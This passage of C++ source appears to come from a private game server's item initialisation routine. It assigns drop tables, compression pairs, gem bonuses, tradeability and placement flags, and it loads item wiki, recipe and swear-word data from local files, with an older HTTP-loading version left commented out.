			items[i].randomitem.push_back(2712);
			items[i].chance = 25;
		}
		else if (i == 2712) {
			items[i].randomitem.push_back(2714);
			items[i].chance = 25;
		}
		else if (i == 8566 || i == 8562 || i == 8564 || i == 8560) {
			items[i].randomitem.push_back(8534);
			items[i].chance = 72;
		}
		else if (i == 2714) {
			items[i].randomitem.push_back(2716);
			items[i].chance = 25;
		}
		else if (i == 1520) {
			items[i].randomitem.push_back(3762);
			items[i].chance = 25;
		}
		else if (i == 616) {
			items[i].randomitem.push_back(618);
			items[i].chance = 5;
		}
		else if (i == 7046) {
			items[i].randomitem.push_back(7058);
			items[i].chance = 5;
		}
		//string test = "add_item\\" + to_string(def.id) + "\\" + to_string(def.editableType) + "\\" + to_string(def.itemCategory) + "\\" + to_string(def.actionType) + "\\" + to_string(def.hitSoundType) + "\\" + def.name + "\\" + def.texture + "\\" + to_string(def.textureHash) + "\\" + to_string(def.itemKind) + "\\" + to_string(def.val1) + "\\" + to_string(def.textureX) + "\\" + to_string(def.textureY) + "\\" + to_string(def.spreadType) + "\\" + to_string(def.isStripeyWallpaper) + "\\" + to_string(def.collisionType) + "\\" + to_string(def.breakHits) + "\\" + to_string(def.dropChance) + "\\" + to_string(def.clothingType) + "\\" + to_string(def.rarity) + "\\" + to_string(def.maxAmount) + "\\" + def.extraFile + "\\" + to_string(def.extraFileHash) + "\\" + to_string(def.audioVolume) + "\\" + def.petName + "\\" + def.petPrefix + "\\" + def.petAbility + "\\" + def.seedBase + "\\" + def.seedOverlay + "\\" + def.treeBase + "\\" + def.treeLeaves + "\\" + def.seedColor + "\\" + to_string(def.seedOverlayColor) + "\\" + to_string(def.growTime) + "\\" + to_string(def.val2) + "\\" + to_string(def.isRayman) + "\\" + def.extraOptions + "\\" + def.texture2 + "\\" + def.extraOptions2 + "\\" + def.punchOptions + "";
		//cout << test << endl;
		//cout << "add_item\\" + to_string(def.id) + "\\" + to_string(def.editableType) + "\\" + to_string(def.itemCategory) + "\\" + to_string(def.actionType) + "\\" + to_string(def.hitSoundType) + "\\" + def.name + "\\" + def.texture + "\\" + to_string(def.textureHash) + "\\" + to_string(def.itemKind) + "\\" + to_string(def.val1) + "\\" + to_string(def.textureX) + "\\" + to_string(def.textureY) + "\\" + to_string(def.spreadType) + "\\" + to_string(def.isStripeyWallpaper) + "\\" + to_string(def.collisionType) + "\\" + to_string(def.breakHits) + "\\" + to_string(def.dropChance) + "\\" + to_string(def.clothingType) + "\\" + to_string(def.rarity) + "\\" + to_string(def.maxAmount) + "\\" + def.extraFile + "\\" + to_string(def.extraFileHash) + "\\" + to_string(def.audioVolume) + "\\" + def.petName + "\\" + def.petPrefix + "\\" + def.petAbility + "\\" + def.seedBase + "\\" + def.seedOverlay + "\\" + def.treeBase + "\\" + def.treeLeaves + "\\" + def.seedColor + "\\" + to_string(def.seedOverlayColor) + "\\" + to_string(def.growTime) + "\\" + to_string(def.val2) + "\\" + to_string(def.isRayman) + "\\" + def.extraOptions + "\\" + def.texture2 + "\\" + def.extraOptions2 + "\\" + def.punchOptions + "" << endl;
	}
	delete[] data;
	/*
	{
		http::Request request{ "http://145.239.149.135:1337/server_items/wiki.txt" };
		const auto response = request.send("GET");
		string file_infos = string{ response.body.begin(), response.body.end() };
		replaceAll(file_infos, "\r", "");
		vector<string> d_ = explode("\n", file_infos);
		for (int i = 0; i < d_.size(); i++) {
			string itemas = d_[i];
			vector<string> ds_ = explode("|", itemas);
			items[atoi(ds_[0].c_str())].chi = atoi(ds_[1].c_str());
			if (ds_[2] != "" and ds_[3] != "" and isdigit(ds_[2][0]) and isdigit(ds_[3][0])) {
				items[atoi(ds_[0].c_str())].r_1 = atoi(ds_[2].c_str());
				items[atoi(ds_[0].c_str())].r_2 = atoi(ds_[3].c_str());
				if (items[atoi(ds_[0].c_str())].r_1 % 2 == 0) items[atoi(ds_[0].c_str())].r_1++;
				if (items[atoi(ds_[0].c_str())].r_2 % 2 == 0) items[atoi(ds_[0].c_str())].r_2++;
			}
			if (ds_[4] != "") items[atoi(ds_[0].c_str())].on_equip = ds_[4];
			if (ds_[5] != "") items[atoi(ds_[0].c_str())].on_remove = ds_[5];
			if (ds_[6] != "") items[atoi(ds_[0].c_str())].description = ds_[6];
			if (ds_[7] != "" and isdigit(ds_[7][0])) items[atoi(ds_[0].c_str())].max_gems = atoi(ds_[7].c_str());
			if (ds_[8] != "") items[atoi(ds_[0].c_str())].playmod = ds_[8];
		}
		http::Request request2{ "http://145.239.149.135:1337/server_items/en" };
		const auto response2 = request2.send("GET");
		file_infos = string{ response2.body.begin(), response2.body.end() };
		replaceAll(file_infos, "\r", "");
		d_ = explode("\n", file_infos);
		for (int i = 0; i < d_.size(); i++) {
			string itemas = d_[i];
			transform(itemas.begin(), itemas.end(), itemas.begin(), ::toupper);
			swear_words.push_back(itemas);
		}
		http::Request request3{ "http://145.239.149.135:1337/server_items/farmables.txt" };
		const auto response3 = request3.send("GET");
		file_infos = string{ response3.body.begin(), response3.body.end() };
		replaceAll(file_infos, "\r", "");
		d_ = explode("\n", file_infos);
		for (int ia = 0; ia < d_.size(); ia++) {
			string itemas = d_[ia];
			for (int i_ = 0; i_ < items.size(); i_++) {
				if (items[i_].name == itemas)items[i_].farmable = true;
			}
		}
		http::Request request4{ "http://145.239.149.135:1337/server_items/combiner.txt" };
		const auto response4 = request4.send("GET");
		file_infos = string{ response4.body.begin(), response4.body.end() };
		replaceAll(file_infos, "\r", "");
		d_ = explode("\n", file_infos);
		for (int i = 0; i < d_.size(); i++) {
			string itemas = d_[i];
			vector<vector<int>> form_recipe;
			vector<string> ok = explode("|", itemas);
			int item = 0;
			//items[atoi(ok[0].c_str())].ori_name
			for (string lalala : ok) {
				vector<string> beveik = explode(" ", lalala);
				string check_ = beveik[0];
				int count_ = 1;
				if (isdigit(check_[0])) {
					count_ = atoi(check_.c_str());
				}
				if (count_ != 1) {
					replace_str(lalala, check_ + " ", "");
				}
				if (lalala.find("pairs of ") != string::npos or lalala.find("pair of ") != string::npos)
					lalala = explode((lalala.find("pairs of ") != string::npos ? "pairs of " : "pair of "), lalala)[1];
				string ex = lalala;
				ex.erase(ex.size() - 1);
				for (int i_ = 0; i_ < items.size(); i_++) {
					if (items[i_].ori_name == lalala or items[i_].ori_name == ex) {
						form_recipe.push_back({ items[i_].id, count_ });
						item = items[i_].id;
						break;
					}
				}
			}
			if (form_recipe.size() == 4) receptai.push_back(form_recipe);
		}
		http::Request request5{ "http://145.239.149.135:1337/server_items/kainos.txt" };
		const auto response5 = request5.send("GET");
		file_infos = string{ response5.body.begin(), response5.body.end() };
		replaceAll(file_infos, "\r", "");
		d_ = explode("\n", file_infos);
		for (int i = 0; i < d_.size(); i++) {
			string itemas = d_[i];
			vector<string> ok = explode("|", itemas);
			kainos.push_back({ atoi(ok[0].c_str()), atoi(ok[1].c_str()) });
		}
	}*/
	/*
	{
		ifstream file_info("db/item_prices.txt");
		if (file_info.is_open()) {
			string line_info;
			while (getline(file_info, line_info)) {
				vector<string> d_ = explode("|", line_info);
				item_prices.push_back(make_pair(d_[0].c_str(), atoi(d_[1].c_str())));
			}
			file_info.close();
		}
	}

	string available_items = "";
	for (int i = 0; i < item_prices.size(); i++) {
		string item_Name = item_prices[i].first;
		int id_ = 0;
		for (int i = 0; i < itemCount; i++) {
			if (items[i].ori_name == item_Name) {
				id_ = i;
				break;
			}
		}
		available_items += to_string(id_) + "|"+to_string(item_prices[i].second) + "\n";
	}
	{
		ofstream m;
		m.open("db/swx.txt"), m << available_items, m.close();
	}*/
	ifstream file_info("db/items/wiki.txt");
	if (file_info.is_open()) {
		string line_info;
		while (getline(file_info, line_info)) {
			vector<string> d_ = explode("|", line_info);
			items[atoi(d_[0].c_str())].chi = atoi(d_[1].c_str());
			if (d_[2] != "" and d_[3] != "" and isdigit(d_[2][0]) and isdigit(d_[3][0])) {
				items[atoi(d_[0].c_str())].r_1 = atoi(d_[2].c_str());
				items[atoi(d_[0].c_str())].r_2 = atoi(d_[3].c_str());
				if (items[atoi(d_[0].c_str())].r_1 % 2 == 0) items[atoi(d_[0].c_str())].r_1++;
				if (items[atoi(d_[0].c_str())].r_2 % 2 == 0) items[atoi(d_[0].c_str())].r_2++;
			}
			if (d_[4] != "") items[atoi(d_[0].c_str())].on_equip = d_[4];
			if (d_[5] != "") items[atoi(d_[0].c_str())].on_remove = d_[5];
			if (d_[6] != "") items[atoi(d_[0].c_str())].description = d_[6];
			if (d_[8] != "" and isdigit(d_[8][0])) items[atoi(d_[0].c_str())].max_gems = atoi(d_[8].c_str());
			if (d_[10] != "") items[atoi(d_[0].c_str())].playmod = d_[10];
		}
		file_info.close();
		{
			ifstream file_info("db/items/en");
			if (file_info.is_open()) {
				string line_info;
				while (getline(file_info, line_info)) {
					transform(line_info.begin(), line_info.end(), line_info.begin(), ::toupper);
					swear_words.push_back(line_info);
				}
			}
			file_info.close();
			{
				ifstream file_info("db/items/farmables.txt");
				if (file_info.is_open()) {
					string line_info;
					while (getline(file_info, line_info)) {
						for (int i_ = 0; i_ < items.size(); i_++) {
							if (items[i_].name == line_info)
								items[i_].farmable = true;
						}
					}
				}
				file_info.close();
				{
					ifstream file_info("db/items/combiner.txt");
					if (file_info.is_open()) {
						string line_info, a = "";
						while (getline(file_info, line_info)) {
							vector<vector<int>> form_recipe;
							vector<string> ok = explode("|", line_info);
							int item = 0;
							//items[atoi(ok[0].c_str())].ori_name
							for (string lalala : ok) {
								vector<string> beveik = explode(" ", lalala);
								string check_ = beveik[0];
								int count_ = 1;
								if (isdigit(check_[0])) {
									count_ = atoi(check_.c_str());
								}
								if (count_ != 1) {
									replace_str(lalala, check_ + " ", "");
								}
								if (lalala.find("pairs of ") != string::npos or lalala.find("pair of ") != string::npos)
									lalala = explode((lalala.find("pairs of ") != string::npos ? "pairs of " : "pair of "), lalala)[1];
								string ex = lalala;
								ex.erase(ex.size() - 1);
								for (int i_ = 0; i_ < items.size(); i_++) {
									if (items[i_].ori_name == lalala or items[i_].ori_name == ex) {
										form_recipe.push_back({ items[i_].id, count_ });
										item = items[i_].id;
										break;
									}
								}
							}
							if (form_recipe.size() == 4) receptai.push_back(form_recipe);
						}
					}
					file_info.close();
				}
			}
		}
	}
	items[5000].blockType = WEATHER;
	items[3832].blockType = WEATHER;
	items[10058].blockType = WEATHER;
	items[9928].max_gems = 100;
	for (vector<vector<int>>recipe : receptai) combining.push_back("\nadd_label_with_icon|small|`1" + to_string(recipe[3][1]) + " " + items[recipe[3][0]].ori_name + "`` = `w" + to_string(recipe[0][1]) + "x " + items[recipe[0][0]].ori_name + "`` + `w" + to_string(recipe[1][1]) + "x " + items[recipe[1][0]].ori_name + "`` + `w" + to_string(recipe[2][1]) + "x " + items[recipe[2][0]].ori_name + "``|left|" + to_string(recipe[3][0]) + "|");
	for (vector<vector<int>>crystal : crystal_receptai) {
		string recipe_text = "";
		vector<string> recipes;
		for (int i = 0; i < 5; i++) if (crystal[i][1]) recipes.push_back("`w" + to_string(crystal[i][1]) + "x " + items[crystal[i][0]].ori_name + "``");
		for (int b = 0; b < recipes.size(); b++) {
			if (recipes.size() - b == 1)recipe_text += recipes[b];
			else  recipe_text += recipes[b] + " + ";
		}
		crystals.push_back("\nadd_label_with_icon|small|`1" + (crystal[5][1] == 0 ? "" : to_string(crystal[5][1])) + " " + items[crystal[5][0]].ori_name + "`` = " + recipe_text + "``|left|" + to_string(crystal[5][0]) + "|");
	}
	for (int i = 0; i < info_about_playmods.size(); i++) {
		int item_id = atoi(info_about_playmods[i][1].c_str());
		items[item_id].playmod_id = atoi(info_about_playmods[i][0].c_str());
	}
	items[9882].playmod_id = 126;
	items[6860].playmod_id = 132;
	items[6862].playmod_id = 133;
	items[8186].playmod_id = 132;
	items[4846].playmod_id = 136;
	items[4848].playmod_id = 136;
	items[9902].randomitem = { 9908, 9854 , 9856 , 9882 ,8188, 9266, 6856 };
	items[9528].wrench_by_public = true;
	for (int i = 0; i < itemCount; i++) {
		if (i == 9784 || i == 9780 || i == 7734 || i == 6026 || i == 9782 || i == 9488 || i == 9776 || i == 9778 || i == 9774 || i == 1790 || i == 8430 || i == 9532 || i == 9548 || i == 8430 || i == 9550 || i == 9574 || i == 9576 || i == 9604 || i == 9766 || i == 9770 || i == 9772 || i == 5814 || i == 9640 || i == 1674 || i == 5480 || i == 9786 || i == 1784 || i == 1782 || i == 1780 || i == 2592 || i == 8286 || i == 1970 || i == 9800 || i == 9802 || i == 9804 || i == 9806 || i == 9808 || i == 9810 || i == 9812 || i == 9814 || i == 9542 || i == 9830 || i == 1460 || i == 2392 || i == 9726 || i == 5158 || i == 9764 || i == 9726 || i == 9812 || i == 9878 || i == 9886 || i == 9880 || i == 12400 || i == 9884 || i == 12986 || i == 12684 || i == 9890 || i == 12398 || i == 9906 || i == 9896 || i == 9908 || i == 9914 || i == 10290 || i == 9916 || i == 9918 || i == 13118 || i == 9984 || i == 9964 || i == 9980 || i == 9996 || i == 9974 || i == 10020 || i == 10120 || i == 10018 || i == 9838 || i == 9846 || i == 5126 || i == 5128 || i == 5130 || i == 5132 || i == 5134 || i == 5144 || i == 5146 || i == 5148 || i == 5150 || i == 5152 || i == 5162 || i == 5164 || i == 5166 || i == 5168 || i == 5170 || i == 5180 || i == 5182 || i == 5184 || i == 5186 || i == 5188 || i == 7168 || i == 7170 || i == 7172 || i == 7174 || i == 9212 || i == 9846 || i == 10384 || i == 10936 || i == 10938 || i == 10940 || i == 10932 || i == 10942 || i == 10684 || i == 10934 || i == 10946 || i == 10944) items[i].unobtainable = true;
		if (items[i].blockType == CLOTHING && items[i].unobtainable == false && i != 1780 && items[i].untradeable == 0) dstone.push_back(i);
		if (i == 778) items[i].breakHits = 1;
		if (items[i].ori_name.find("null") != string::npos) items[i].blocked_place = true;
		if (i == 8470 || i == 10372) continue;
		if (i >= items.size() - 200) {
			if (items[i].ori_name.find("null") == string::npos && i % 2 == 0 && items[i].untradeable == 0) {
				random_shop_item.push_back(i);
			}
		}
		if (item_playmod(i, "putt putt putt") || item_playmod(i, "Black Magic")) items[i].playmod_total += "Black Magic";
		if (item_playmod(i, "double jump") || item_playmod(i, "hoveration!") || item_playmod(i, "Spirit Form") || item_playmod(i, "aurora") || item_playmod(i, "Jump: Enchantment") || item_playmod(i, "Flame On")) items[i].playmod_total += "double jump";
		if (item_playmod(i, "build range") || item_playmod(i, "energized horn") || item_playmod(i, "Punch Damage + Build Range: Neptune's Trident") || item_playmod(i, "Extended Punch and Build Range...")) items[i].playmod_total += "build range ";
		if (item_playmod(i, "punch range") || item_playmod(i, "Extended Punch and Build Range...") || item_playmod(i, "Punch Range and Build Range")) items[i].playmod_total += " punch range ";
		if (item_playmod(i, "eye beam") || item_playmod(i, "cupid's firepower")) items[i].playmod_total += " punch range- ";
		if (item_playmod(i, "high jump"))items[i].playmod_total += " high jump ";
		if (item_playmod(i, "fists o' fury") || item_playmod(i, "Legendary Rayman's Fist") || item_playmod(i, "Legendary!"))items[i].playmod_total += " fists o' fury ";
		if (item_playmod(i, "Speedy") || item_playmod(i, "Mythical Rayman's Fist: One hit, Double XP, Double OPC, Extremely Long Punch, Extremely Long Build, Super Strong Punch, Shining & Speedy")) items[i].playmod_total += " speedy ";
		if (item_playmod(i, "Fishy")) items[i].playmod_total += " punch range+ ";
		if (item_playmod(i, "Muted by stitches!") || item_playmod(i, "Iron MMMFF")) items[i].playmod_total += " Iron MMMFF ";
		if (item_playmod(i, "Enhanced Digging") || item_playmod(i, "diggin' it") || item_playmod(i, "Dragonborn") or item_playmod(i, "Death To Blocks!")) items[i].playmod_total += " Enhanced Digging ";
		if (item_playmod(i, "I'm On A Shark!") || item_playmod(i, "Slightly Damp") || item_playmod(i, "Speedy in Water") || item_playmod(i, "XP Buff: Wolf Worlds") or item_playmod(i, "A Little Fishy") or item_playmod(i, "Slightly Damp") or item_playmod(i, "Will of the Wild")) items[i].playmod_total += " water ";
		if (item_playmod(i, "Slowfall") || item_playmod(i, "Slowfall:")) items[i].playmod_total += " slowfall ";
		if (items[i].playmod_total.empty()) items[i].playmod_total = items[i].playmod;

		if (i == 2204) {
			items[i].geiger_give_back = 2286;
			items[2286].geiger_give_back = 2204;
		}
		if (i == 2558) {
			items[i].geiger_give_back = 2560;
			items[2560].geiger_give_back = 2558;
		}
		if (i == 1684 || i == 1912 || i == 4482 || i == 4446) items[i].path_marker = true;
		if (i == 9528 || i == 758 || i == 9528 || i == 756 || i == 9922 || i == 1902 || i == 1900 || items[i].blockType == BlockTypes::DONATION || items[i].blockType == BlockTypes::VENDING || i == 9528 || i != 2398 || i == 9828 || i == 12826 || items[i].blockType == BlockTypes::BULLETIN_BOARD || items[i].blockType == BlockTypes::MAILBOX) {
			if (i == 10374 || i == 2072 || items[i].blockType == BlockTypes::GATEWAY || items[i].blockType == BlockTypes::SIGN or items[i].can_be_changed_to_public || i == 4296 || i == 8558 || items[i].blockType == BlockTypes::KRANKEN || items[i].blockType == 20 || items[i].blockType == BlockTypes::SIGN || items[i].blockType == BlockTypes::DISPLAY || items[i].blockType == BlockTypes::WEATHER || items[i].blockType == BlockTypes::DOOR || items[i].blockType == BlockTypes::PORTAL || i == 1436 || i == 8246 || i == 10258 || i == 4296 || items[i].blockType == BlockTypes::LOCK) {
			}
			else items[i].wrench_by_public = true;

		}/*
		if (items[i].playmod_id != 0) {
			if (info_about_playmods.size() < items[i].playmod_id) {
				string info = info_about_playmods[items[i].playmod_id - 1][2];
				ConsumableDB def;
				if (info.find("Extra XP") != string::npos) {
					def.extra_xp = true;
				}
				if (info.find("Frozen") != string::npos) {
					def.frozen = true;
				}
				consumables.push_back(def);
			}
		}*/
		//if (i == 9844)cout << items[i].actionType << endl;
		if (i == 2072 || items[i].blockType == BlockTypes::BULLETIN_BOARD || i == 10924 || items[i].blockType == BlockTypes::PHONE || items[i].actionType == 92 || items[i].blockType == BlockTypes::CRYSTAL or items[i].blockType == BlockTypes::STORAGE or i == 6016 or items[i].blockType == BlockTypes::CCTV or  i == 2646 or i == 4722 or items[i].actionType == 89 || items[i].actionType == 98 || i == 6546 || i == 5318 || i == 3760 || i == 4830 || i == 9346) {
			if (i != 3832) items[i].simple_load = true;
		}
		if (i == 3002 || items[i].ori_name.find("Guild Flag") != string::npos || items[i].ori_name.find("Guild Entrance") != string::npos || items[i].ori_name.find("Guild Banner") != string::npos) {
			items[i].blocked_place = true;
		}
		//if (items[i].price.size() == 0 && i % 2 == 0 && items[i].untradeable == 0) cout << items[i].ori_name << endl;
		if (i == 1926)items[i].collisionType = 1;
		if (i == 242) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 1796;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 7188) {
			items[i].compress_return_count = 1;
			items[i].compress_item_return = 1796;
		}
		if (i == 4844) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 4850;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 4846) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 4852;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 4848) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 4854;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 4844) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 4852;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 4354) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 4356;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 12766) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 12768;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 4298) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 4300;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 4450) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 4452;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 1486) {
			items[i].compress_return_count = 100;
			items[i].compress_item_return = 6802;
			items[items[i].compress_item_return].compress_return_count = 1;
			items[items[i].compress_item_return].compress_item_return = i;
		}
		if (i == 10)  items[i].fossil_rock = 3918, items[items[i].fossil_rock].fossil_rock2 = i, items[items[i].fossil_rock].blockType = BlockTypes::FOSSIL;
		if (i == 1538)  items[i].fossil_rock = 3922, items[items[i].fossil_rock].fossil_rock2 = i, items[items[i].fossil_rock].blockType = BlockTypes::FOSSIL;
		if (i == 1134) items[i].fossil_rock = 3926, items[items[i].fossil_rock].fossil_rock2 = i, items[items[i].fossil_rock].blockType = BlockTypes::FOSSIL;
		if (i == 3930) items[i].fossil_rock = 3928, items[items[i].fossil_rock].fossil_rock2 = i, items[items[i].fossil_rock].blockType = BlockTypes::FOSSIL;
		if (i == 2492) items[i].fossil_rock = 3924, items[items[i].fossil_rock].fossil_rock2 = i, items[items[i].fossil_rock].blockType = BlockTypes::FOSSIL;
		if (i == 944) items[i].fossil_rock = 3920, items[items[i].fossil_rock].fossil_rock2 = i, items[items[i].fossil_rock].blockType = BlockTypes::FOSSIL;


		// blarney shop x y
		if (i == 13324) items[i].shop_X = 1, items[i].shop_Y = 0;
		if (i == 13322) items[i].shop_X = 2, items[i].shop_Y = 0;
		if (i == 13320) items[i].shop_X = 3, items[i].shop_Y = 0;
		if (i == 13326) items[i].shop_X = 4, items[i].shop_Y = 0;


		if (i == 6238)  items[i].description = "Earn points by hitting things with `2GrowTech's special anomalizing hammers`` - the better the hammer, the bigger the score! Players can earn points by `2smashing`` blocks with appropriate hammers equipped.", items[i].hand_scythe_text = "Block Bashers", items[i].texture_name = "store_buttons20.rttex", items[i].texture_y = 4;
		if (i == 6828)  items[i].description = "Earn points by building blocks with `2GrowTech's special anomalizing trowels`` - the better the trowel, the bigger the score! Players can earn points by `2placing blocks`` with appropriate trowels equipped.", items[i].hand_scythe_text = "Block Builders", items[i].texture_name = "store_buttons21.rttex", items[i].texture_y = 4;
		if (i == 6256)  items[i].description = "Earn points by catching fish with `2GrowTech's special anomalizing rods`` - the better the rod, the bigger the score! Players can earn points by `2fishing`` with appropriate fishing rods equipped.", items[i].hand_scythe_text = "Fishing Fanatics", items[i].texture_name = "store_buttons20.rttex", items[i].texture_y = 2;
		if (i == 6244)  items[i].description = "Earn points by harvesting things with `2GrowTech's special anomalizing scythes`` - the better the scythe, the bigger the score! Players can earn points by `2harvesting trees`` with appropriate scythes equipped.", items[i].hand_scythe_text = "Harvest Heroes", items[i].texture_name = "store_buttons20.rttex", items[i].texture_y = 5;
		if (i == 6834)  items[i].description = "Earn points by splicing seeds with `2GrowTech's special anomalizing cultivators`` - the better the cultivator, the bigger the score! Players can earn points by `2splicing seeds`` with appropriate cultivators equipped.", items[i].hand_scythe_text = "Speedy Splicers", items[i].texture_name = "store_buttons21.rttex", items[i].texture_y = 3;
		if (i == 6250)  items[i].description = "Earn points by completing surgeries with `2GrowTech's special anomalizing bone saws`` - the better the bone saw, the bigger the score! Players can earn points by `2performing surgeries`` with appropriate bone saws equipped.", items[i].hand_scythe_text = "Surgery Stars", items[i].texture_name = "store_buttons20.rttex", items[i].texture_y = 3;
	//if (i > 12000)	cout << i << "|" << items[i].chi << "|" << (items[i].r_1 == 0 ? "" : to_string(items[i].r_1)) << "|" << (items[i].r_2 == 0 ? "" : to_string(items[i].r_2)) << "|" << items[i].on_equip << "|" << items[i].on_remove << "|" << (items[i].description == "This item has no description." ? "" : items[i].description) << "|" << items[i].max_gems << "|" << items[i].playmod << "|" << endl;
		if (i == 822)items[i].block_flag = 0x04000000;
		if (items[i].fossil_rock != 0) items[items[i].fossil_rock].block_flag = 0x0400000;
		if (i == 3062 || i == 3102)items[i].block_flag = 0x10000000;
		if (i == 1866)items[i].block_flag = 0x08000000;
	//	if (items[i].max_gems  != 0) cout << items[i].ori_name << " | " << items[i].max_gems << endl;
		if (i == 9786) items[i].extra_gems = 5;
		if (i == 9830) items[i].extra_gems = 7;
		if (i == 6312 || i == 11118 || i == 9550 ||i == 9800 || i == 9810 || i == 9800 || i == 10124) items[i].extra_gems = 3;
		if (i == 9496 || i == 9546 || i == 9878) items[i].extra_gems = 4;
		if (i == 9890 || i == 9908)  items[i].extra_gems = 10;
		if (i == 9574 || i == 9812 || i == 9880 || i == 9984 || i == 9766 || i == 9542 || i == 9916 || i == 9914 || i == 9974 || i == 9964 || i == 10120 || i == 10122) items[i].extra_gems = 20;
		if (i == 10126) items[i].extra_gems = 19;
		if (i == 10020) items[i].extra_gems = 40;
		if (i == 9548 || i == 9918 || i == 10290 || i == 10176 || i == 9846) items[i].extra_gems = 50;
		if (i == 10384) items[i].extra_gems = 150;
		if (i == 9604) items[i].extra_gems = 54;
		if (i == 9774) items[i].extra_gems = 55;
		if (i == 9776 || i == 9536 || i == 3774 || i == 278 || i == 11818 || i == 9524 || i == 9526 || i == 9520 || i == 9522 || i == 9492 || i == 9168 || i == 7962 || i == 5190 || i == 8428 || i == 5196 || i == 5194 || i == 11478 || i == 1442 || i == 11466 || i == 11288 || i == 11134 || i == 10396 || i == 11562 || i == 5156 || i == 5160 || i == 5172 || i == 5174 || i == 5176 || i == 5154 || i == 9532 || i == 9534 || i == 9540 || i == 12628 || i == 12630 || i == 12632 || i == 12634 || i == 12636 || i == 12638 || i == 12640 || i == 5156 || i == 9950 || i == 10024 || i == 101) items[i].untradeable = 0; // rift wings 
		if (i == 9802 || i == 9806 || i == 9808 || i == 9804) items[i].untradeable = 1;
		if (i == 9814)  items[i].randomitem = { 6016, 4802,4534 , 4590 , 4628 , 4746 , 4988 , 5020 , 5088 , 5206 , 5322 , 5712 , 6294 , 6338 , 6758 , 6892 , 7192 , 7196 , 7384 , 7568 , 7570 , 7572, 7574,  7676 , 7678, 7680, 7682, 7836, 7838, 7840, 7842, 8006, 8008, 8010, 8012, 8288, 8290, 8292, 8294, 8432, 8434, 8436, 8438, 8576, 8578, 8580, 8582, 8816, 8818, 8820, 8822, 8898, 8900, 8902, 8904, 9008, 9010, 9012, 9014, 9116, 9118, 9120, 9122, 9136, 9138, 9236, 9348, 9408, 9462, 9464, 9606, 9648, 9760, 10044, 10128, 10166, 10246, 10426, 10496, 10618, 10666, 10718, 10810, 10914, 11006, 11116, 11232, 4534 , 4590 , 4628 , 4746  , 4988 , 5020 , 5088 , 5206 , 5322 , 5712  , 6294 , 6338 , 6758 , 6892 , 7192 , 7196 , 7384 , 7568 , 7570 , 7572, 7574,  7676 , 7678, 7680, 7682, 7836, 7838, 7840, 7842, 8006, 8008, 8010, 8012, 8288, 8290, 8292, 8294, 8432, 8434, 8436, 8438, 8576, 8578, 8580, 8582, 8816, 8818, 8820, 8822, 8898, 8900, 8902, 8904, 9008, 9010, 9012, 9014, 9116, 9118, 9120, 9122, 9136, 9138, 9236, 9348, 9408, 9462, 9464, 9606, 9648, 9760, 10044, 10128, 10166, 10246, 10426, 10496, 10618, 10666, 10718, 10810, 10914, 11006, 11116, 11232, 4534 , 4590 , 4628 , 4746  , 4988 , 5020 , 5088 , 5206 , 5322 , 5712 , 6294 , 6338 , 6758 , 6892 , 7192 , 7196 , 7384 , 7568 , 7570 , 7572, 7574,  7676 , 7678, 7680, 7682, 7836, 7838, 7840, 7842, 8006, 8008, 8010, 8012, 8288, 8290, 8292, 8294, 8432, 8434, 8436, 8438, 8576, 8578, 8580, 8582, 8816, 8818, 8820, 8822, 8898, 8900, 8902, 8904, 9008, 9010, 9012, 9014, 9116, 9118, 9120, 9122, 9136, 9138, 9236, 9348, 9408, 9462, 9464, 9606, 9648, 9760, 10044, 10128, 10166, 10246, 10426, 10496, 10618, 10666, 10718, 10810, 10914, 11006, 11116, 11232, 4534 , 4590 , 4628 , 4746  , 4988 , 5020 , 5088 , 5206 , 5322 , 5712  , 6294 , 6338 , 6758 , 6892 , 7192 , 7196 , 7384 , 7568 , 7570 , 7572, 7574,  7676 , 7678, 7680, 7682, 7836, 7838, 7840, 7842, 8006, 8008, 8010, 8012, 8288, 8290, 8292, 8294, 8432, 8434, 8436, 8438, 8576, 8578, 8580, 8582, 8816, 8818, 8820, 8822, 8898, 8900, 8902, 8904, 9008, 9010, 9012, 9014, 9116, 9118, 9120, 9122, 9136, 9138, 9236, 9348, 9408, 9462, 9464, 9606, 9648, 9760, 10044, 10128, 10166, 10246, 10426, 10496, 10618, 10666, 10718, 10810, 10914, 11006, 11116, 11232, 4802,4534 , 4590 , 4628 , 4746 , 4988 , 5020 , 5088 , 5206 , 5322 , 5712 , 6294 , 6338 , 6758 , 6892 , 7192 , 7196 , 7384 , 7568 , 7570 , 7572, 7574,  7676 , 7678, 7680, 7682, 7836, 7838, 7840, 7842, 8006, 8008, 8010, 8012, 8288, 8290, 8292, 8294, 8432, 8434, 8436, 8438, 8576, 8578, 8580, 8582, 8816, 8818, 8820, 8822, 8898, 8900, 8902, 8904, 9008, 9010, 9012, 9014, 9116, 9118, 9120, 9122, 9136, 9138, 9236, 9348, 9408, 9462, 9464, 9606, 9648, 9760, 10044, 10128, 10166, 10246, 10426, 10496, 10618, 10666, 10718, 10810, 10914, 11006, 11116, 11232, 4534 , 4590 , 4628 , 4746  , 4988 , 5020 , 5088 , 5206 , 5322 , 5712  , 6294 , 6338 , 6758 , 6892 , 7192 , 7196 , 7384 , 7568 , 7570 , 7572, 7574,  7676 , 